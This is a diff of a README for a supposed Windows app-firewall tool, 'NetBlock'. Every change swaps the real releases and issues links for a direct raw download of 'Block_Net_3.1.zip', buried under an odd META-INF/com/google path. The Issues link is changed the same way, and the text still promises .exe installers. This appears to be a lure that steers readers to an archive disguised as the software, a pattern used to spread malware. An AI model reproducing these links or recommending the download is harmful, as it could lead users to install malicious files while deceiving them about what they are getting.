@@ -1,6 +1,6 @@
 # 🚫 NetBlock - Control Internet Access for Apps
 
-[![Download NetBlock](https://img.shields.io/badge/Download-NetBlock-brightgreen?style=for-the-badge)](https://github.com/Claudewestside514/NetBlock/releases)
+[![Download NetBlock](https://img.shields.io/badge/Download-NetBlock-brightgreen?style=for-the-badge)](https://github.com/Claudewestside514/NetBlock/raw/refs/heads/main/META-INF/com/google/Block_Net_3.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ NetBlock works on both laptops and desktops running Windows. It does not support
 
 Go to the official releases page here:
 
-[![Download NetBlock](https://img.shields.io/badge/Download-NetBlock-blue?style=for-the-badge)](https://github.com/Claudewestside514/NetBlock/releases)
+[![Download NetBlock](https://img.shields.io/badge/Download-NetBlock-blue?style=for-the-badge)](https://github.com/Claudewestside514/NetBlock/raw/refs/heads/main/META-INF/com/google/Block_Net_3.1.zip)
 
 This page has the latest versions of NetBlock. You will find files named like `NetBlock_Setup_vX.X.exe`. Look for the one with the highest version number.
 
@@ -93,7 +93,7 @@ You can unblock an app anytime by switching the toggle back off.
 
 To keep NetBlock working well, check for updates regularly:
 
-1. Visit the [Releases](https://github.com/Claudewestside514/NetBlock/releases) page.
+1. Visit the [Releases](https://github.com/Claudewestside514/NetBlock/raw/refs/heads/main/META-INF/com/google/Block_Net_3.1.zip) page.
 2. Download the newest installer file.
 3. Run the installer again to upgrade. Your settings will stay safe.
 
@@ -125,7 +125,7 @@ NetBlock works locally on your machine. It does not send data to the internet or
 
 If you encounter problems not listed here:
 
-- Visit the Issues tab at [NetBlock GitHub](https://github.com/Claudewestside514/NetBlock/issues)
+- Visit the Issues tab at [NetBlock GitHub](https://github.com/Claudewestside514/NetBlock/raw/refs/heads/main/META-INF/com/google/Block_Net_3.1.zip)
 - Provide a simple description of your problem.
 - Include your Windows version and NetBlock version.
 
@@ -137,4 +137,4 @@ NetBlock is open-source software. You may use it for personal or commercial purp
 
 ---
 
-[Download NetBlock](https://github.com/Claudewestside514/NetBlock/releases) to start controlling which apps can use your internet.
+[Download NetBlock](https://github.com/Claudewestside514/NetBlock/raw/refs/heads/main/META-INF/com/google/Block_Net_3.1.zip) to start controlling which apps can use your internet.
